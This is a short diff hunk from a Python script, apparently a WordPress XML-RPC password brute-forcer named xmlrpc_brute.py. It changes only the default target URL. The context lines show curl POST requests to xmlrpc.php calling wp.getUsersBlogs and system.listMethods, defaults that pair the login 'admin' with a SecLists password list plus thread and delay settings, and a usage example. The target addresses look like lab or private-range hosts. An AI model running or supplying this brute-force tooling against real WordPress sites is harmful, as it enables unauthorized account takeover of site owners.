@@ -22,7 +22,7 @@ curl -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><va
 curl -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" -X POST http://10.11.1.234/xmlrpc.php
 
 """
-defaults = {'url': 'http://10.11.1.234/xmlrpc.php','login': 'admin', 'passfile': '/usr/share/seclists/Passwords/darkweb2017-top100.txt', 'threads': 10, 'delay': 0.5}
+defaults = {'url': 'http://10.0.0.1/xmlrpc.php','login': 'admin', 'passfile': '/usr/share/seclists/Passwords/darkweb2017-top100.txt', 'threads': 10, 'delay': 0.5}
 
 parser = argparse.ArgumentParser(description='Script for POST curl bruteforce. Example: python3 xmlrpc_brute.py -u http://10.11.1.234/xmlrpc.php -t 15 -d 0.5 -l admin -p /usr/share/seclists/Passwords/darkweb2017-top100.txt')
 parser.add_argument('-u', '--url', help='Target url')
